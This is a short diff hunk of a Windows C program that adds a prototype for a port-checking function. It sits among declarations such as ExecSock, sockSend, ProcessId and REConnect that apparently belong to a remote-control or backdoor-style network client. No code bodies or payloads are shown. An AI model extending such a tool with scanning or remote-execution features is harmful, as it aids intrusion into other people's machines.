@@ -48,6 +48,7 @@ void sockSend(const char* data);
 DWORD ProcessId(LPCTSTR ProcessName);
 void ExecSock(void);
 void CheckHost(const char* ip_address);
+void checkPort(const char* ip, int port);
 const char* IP2Host(const char* IP);
 void split(char* src, char* dest[5], const char* delimeter);
 void REConnect();
